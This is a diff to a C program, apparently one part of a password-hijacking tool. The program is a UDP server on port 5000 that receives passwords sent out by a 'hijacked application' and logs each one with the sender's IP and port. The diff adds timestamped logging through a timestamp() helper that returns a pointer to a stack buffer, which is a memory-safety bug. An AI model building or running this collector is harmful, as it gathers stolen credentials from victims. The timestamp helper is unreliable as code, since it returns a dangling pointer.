@@ -24,6 +24,7 @@
 #include <sys/socket.h>
 #include <string.h>
 #include <unistd.h>
+#include <time.h>
 
 /*
  * @brief Server port number
@@ -33,6 +34,38 @@
  * @note The default port number is 5000.
 */
 #define SRV_PORT 5000
+
+/*
+ * @brief The size of the buffer used to store the password.
+ * 
+ * @note This size should be large enough to store the password.
+ * @note This size should be synchronized with the size of the buffer used
+ *        by the hijacked application to store the password.
+ * @note This size is set to 1024 by default.
+*/
+#define BUF_SIZE 1024
+
+/*
+ * @brief A function that returns the current time as a string.
+ *
+ * @param void No arguments are passed to the function.
+ * 
+ * @return A string containing the current time.
+ * 
+ * @note The returned string is in the format (HH:MM:SS).
+ * @note The returned string is allocated on the stack.
+*/
+char* timestamp() {
+    char buffer[16];
+    time_t now = time(NULL);
+    struct tm* timest = localtime(&now);
+
+    strftime(buffer, sizeof(buffer), "(%H:%M:%S)", timest);
+
+    char * time = buffer;
+
+    return time;
+}
 
 /*
  * @brief A server program that receives the password from the hijacked
@@ -47,13 +80,13 @@
 int main(void) {
     struct sockaddr_in srv_addr, cli_addr;
 
-    char password[1000] = { 0 };
+    char password[BUF_SIZE] = { 0 };
 
     socklen_t cli_addr_len = 0;
 
     int sockfd = -1, reuse = 1;
 
-    fprintf(stdout, "Starting server...\n");
+    fprintf(stdout, "%s Starting server...\n", timestamp());
 
     memset(&srv_addr, 0, sizeof(srv_addr));
     memset(&cli_addr, 0, sizeof(cli_addr));
@@ -64,23 +97,23 @@ int main(void) {
 
     if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
     {
-        fprintf(stderr, "socket() failed: %s\n", strerror(errno));
+        fprintf(stderr, "%s socket() failed: %s\n", timestamp(), strerror(errno));
         exit(1);
     }
 
     if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) < 0)
     {
-        fprintf(stderr, "setsockopt() failed: %s\n", strerror(errno));
+        fprintf(stderr, "%s setsockopt() failed: %s\n", timestamp(), strerror(errno));
         exit(1);
     }
 
     if (bind(sockfd, (struct sockaddr*) &srv_addr, sizeof(srv_addr)) < 0)
     {
-        fprintf(stderr, "bind() failed: %s\n", strerror(errno));
+        fprintf(stderr, "%s bind() failed: %s\n", timestamp(), strerror(errno));
         exit(1);
     }
 
-    fprintf(stdout, "Waiting for password...\n");
+    fprintf(stdout, "%s Waiting for password...\n", timestamp());
 
     while(1)
     {
@@ -90,15 +123,15 @@ int main(void) {
 
         if ((bytes = recvfrom(sockfd, password, sizeof(password), 0, (struct sockaddr*) &cli_addr, &cli_addr_len)) < 0)
         {
-            fprintf(stderr, "recvfrom() failed: %s\n", strerror(errno));
+            fprintf(stderr, "%s recvfrom() failed: %s\n", timestamp(), strerror(errno));
             exit(1);
         }
 
-        fprintf(stdout, "From: %s:%d received %d bytes\n", inet_ntoa(cli_addr.sin_addr), ntohs(cli_addr.sin_port), bytes);
-        fprintf(stdout, "Password: %s\n\n", password);
+        fprintf(stdout, "%s From: %s:%d received %d bytes\n", timestamp(), inet_ntoa(cli_addr.sin_addr), ntohs(cli_addr.sin_port), bytes);
+        fprintf(stdout, "%s Password: %s\n\n", timestamp(), password);
     }
 
-    fprintf(stdout, "Closing server...\n");
+    fprintf(stdout, "%s Closing server...\n", timestamp());
 
     close(sockfd);
 
